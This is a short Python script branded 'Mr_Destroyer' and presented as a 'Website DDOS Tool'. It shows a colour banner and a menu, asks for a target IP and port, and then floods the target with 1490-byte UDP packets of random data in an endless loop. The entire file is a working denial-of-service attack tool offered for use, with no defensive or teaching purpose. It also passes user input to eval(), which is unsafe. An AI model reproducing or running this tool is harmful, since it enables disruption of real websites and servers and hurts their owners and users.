#python3 
#This tool is Developed By Mohammad Zim
##################################################

#Copyright : Mohammad Zim
#Copright Strike From :- Mohammad Zim
#

###################################################
import socket
import os
import random
import time 
import colorama 
colorama.init()
from colorama import *


#Banner
print(Fore.GREEN + "________________________________________________________________")
print("")
print()
print(Fore.CYAN + "               Mr_Destroyer is here                              |")                            
print()
print(Fore.CYAN + "               Website DDOS Tool by Mr_Destroyer                 |")               
print()
print()
print(Fore.GREEN + "_________________________________________________________________")
print()
print(Fore.GREEN + "Choose Your operating system")
print()
print(Fore.GREEN + "__________________________________________________________________")
print()
print(Fore.CYAN + "[1]"+ Fore.GREEN + " Windows ")
print()
print(Fore.CYAN + "[2]" + Fore.GREEN + "Linux ")
print()
print(Fore.CYAN + "[3]" + Fore.GREEN + " Termux ")
print()
name = input(Fore.GREEN + "choose: ")

if(name=="1"):
    os.system("cls")
    print("Ok , you are using windows!")
    print("[+]Starting...")
    time.sleep(4)
elif(name=="2"):
    os.system("clear")
    print("Ok , You are using linux !")
    print("[+]Attack is starting ..")
    time.sleep(4)
elif(name=="3"):
    os.system("clear")
    print("Ok , you are using termux!")
    print("[+]Attack is starting ..")
    time.sleep(4)
else:
    print("[+]Invalid Option!")
    time.sleep(1)




sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(1490)


ip = input("Enter The Website ip: ")
port = eval(input("Enter The port: "))
sent = 0

while True:
    sock.sendto(bytes , (ip , port))
    sent = sent+1
    print(Fore.RED + "Sending %s packet to %s throught port %s " %(sent,ip,port))
